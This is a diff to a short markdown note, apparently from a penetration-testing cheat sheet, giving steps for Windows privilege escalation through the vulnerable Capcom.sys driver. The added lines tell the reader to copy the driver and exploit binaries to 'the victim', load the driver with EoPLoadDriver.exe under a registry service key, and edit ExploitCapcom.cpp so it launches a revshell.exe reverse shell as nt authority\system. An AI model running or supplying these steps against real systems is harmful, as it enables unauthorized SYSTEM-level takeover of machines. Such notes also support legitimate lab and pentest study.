@@ -1,14 +1,11 @@
 # Loading the driver
 
-Check the SID of a current user.\
-`Get-ADUser -Identity 'svc-print' | select SID`
+Transport all binaries (Capcom.sys, EoPLoadDriver.exe, ExploitCapcom.exe) to the victim.
 
-Edit in the *LoadDriver.cpp* :
+Load the driver with EoPLoadDriver.exe.\
+`EoPLoadDriver.exe System\\CurrentControlSet\\MalService C:\\Users\\Username\\Desktop\\Capcom.sys`
 
-`PCWSTR pPathSource = L"C:\\Users\\svc-print\\Desktop\\Capcom.sys";`\
-`PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";`
+Edit the ExploitCapcom.cpp file before compilation. Change the path of the binary to be run as nt authority\system.\
+`TCHAR CommandLine[] = TEXT("C:\\Users\\Usersname\\Desktop\\revshell.exe");`
 
--------------------------------------------
-
-**pPathSource** - path the the Capcom.sys malicious driver.\
-**pPathSourceReg** - new service in the registry.
+Compile ExploitCapcom and execute on the victim.
